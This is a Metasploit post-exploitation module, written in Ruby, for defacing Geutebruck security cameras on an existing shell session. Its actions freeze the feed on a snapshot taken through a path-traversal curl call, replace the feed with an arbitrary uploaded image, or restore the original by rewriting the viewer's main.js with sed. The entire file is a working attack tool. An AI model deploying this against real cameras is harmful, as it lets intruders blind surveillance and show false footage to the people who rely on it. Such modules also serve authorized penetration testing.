##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize
    super(
      'Name' => 'Geutebruck Camera Deface',
      'Description' => %q{
        This module will take an existing session on a vulnerable Geutebruck Camera
        and will allow the user to either freeze the camera and display the last
        image from the video stream, display an image on the camera, or restore
        the camera back to displaying the current feed/stream.
      },
      'Author' => [
        'Ibrahim Ayadhi', # RandoriSec - Module, Discovery
        'Sébastien Charbonnier', # RandoriSec - Module, Discovery
      ],
      'License' => MSF_LICENSE,
      'Platform' => ['linux'],
      'SessionTypes' => ['shell'],
      'Actions' => [
        ['FREEZE_CAMERA', { 'Description' => 'Freeze the camera and display the last image taken from the video stream' }],
        ['CHANGE_IMAGE', { 'Description' => 'Display an arbitrary image instead of the video stream' }],
        ['RESUME_STREAM', { 'Description' => "Resume the camera's video stream and display the current live feed" }]
      ],
      'DefaultAction' => 'FREEZE_CAMERA'
    )

    register_options(
      [
        OptString.new('IMAGE', [false, 'Full path to the local copy of the image to upload']),
      ]
    )
  end

  def run
    print_status('-- Starting action --')
    case action.name.downcase
    when 'freeze_camera'
      action_freeze_camera
    when 'change_image'
      action_change_image
    when 'resume_stream'
      action_resume_stream
    end
  end

  def action_freeze_camera
    print_status('Taking a snapshot of the current stream to use as the static image to freeze the stream on...')
    cmd_exec('curl http://localhost/test/../uapi-cgi/snapshot.fcgi -o /usr/www/uapi-cgi/viewer/image.fcgi')
    print_status('Freezing the stream on the captured image...')
    pwn_main_js
    print_status('Stream frozen!')
  end

  def action_change_image
    fail_with(Failure::BadConfig, 'The CHANGE_IMAGE action requires the IMAGE option to be set!') if datastore['IMAGE'].blank?
    fail_with(Failure::BadConfig, 'The image path specified by IMAGE does not exist!') unless ::File.exist?(datastore['IMAGE'])
    print_status('Uploading a custom image...')
    upload_file('/usr/www/uapi-cgi/viewer/image.fcgi', datastore['image'])
    pwn_main_js
    print_status('Done! The stream should be replaced by your image!')
  end

  def action_resume_stream
    print_status('Resuming stream...')
    unless file_exist?('/usr/www/viewer/js/main.js.bak')
      fail_with(Failure::NoTarget, "/usr/www/viewer/js/main.js.bak doesn't exist on the target, did you run FREEZE_CAMERA or CHANGE_IMAGE actions yet?")
    end
    print_status('Restoring main.js backup...')
    move_file('/usr/www/viewer/js/main.js.bak', '/usr/www/viewer/js/main.js')
    print_status('Restored! Stream back to a normal state.')
  end

  def pwn_main_js
    print_status('Backing up the original main.js...')
    copy_file('/usr/www/viewer/js/main.js', '/usr/www/viewer/js/main2.js')
    move_file('/usr/www/viewer/js/main.js', '/usr/www/viewer/js/main.js.bak')
    print_status('Using the new main.js...')
    cmd_exec("sed '/ImageBuf.src = snapshot_url;/ i snapshot_url=\"/uapi-cgi/viewer/image.fcgi\"' -i /usr/www/viewer/js/main2.js")
    move_file('/usr/www/viewer/js/main2.js', '/usr/www/viewer/js/main.js')
  end
end
